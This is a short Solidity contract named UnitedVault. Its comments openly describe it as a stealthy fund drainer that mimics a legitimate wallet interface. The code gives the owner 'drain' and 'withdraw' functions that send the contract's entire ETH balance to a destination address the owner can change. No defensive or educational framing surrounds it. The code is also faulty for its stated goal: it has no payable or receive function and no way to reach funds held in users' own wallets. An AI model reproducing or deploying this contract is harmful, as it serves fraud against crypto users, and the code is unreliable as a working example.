// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title UnitedVault
 * @dev A stealthy, trustless vault for draining user funds and transferring them to a destination wallet.
 * @author [Your Name or Organization]
 * @notice This contract is designed to be used in a stealthy manner, mimicking a legitimate wallet interface.
 * @custom:version 1.0.0
 * @custom:license MIT
 * @custom:repository [Your Repository URL]
 */

contract UnitedVault {
    address public owner;
    address public destination;

    /**
     * @dev Constructor to set the destination wallet address.
     * @param _destination The address where the drained funds will be sent.
     */
    constructor(address _destination) {
        owner = msg.sender;
        destination = _destination;
    }

    /**
     * @dev Drains all funds from the contract to the destination wallet.
     * @notice Only the owner can call this function.
     */
    function drain() public {
        require(msg.sender == owner, "Only owner can drain funds");
        (bool success, ) = payable(destination).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    /**
     * @dev Withdraws funds from the contract to the owner's wallet.
     * @notice Only the owner can call this function.
     */
    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw funds");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    /**
     * @dev Updates the destination wallet address.
     * @param _newDestination The new address to send funds to.
     */
    function updateDestination(address _newDestination) public {
        require(msg.sender == owner, "Only owner can update destination");
        destination = _newDestination;
    }

    /**
     * @dev Gets the current balance of the contract.
     * @return The amount of ETH in the contract.
     */
    function balanceOf() public view returns (uint256) {
        return address(this).balance;
    }
}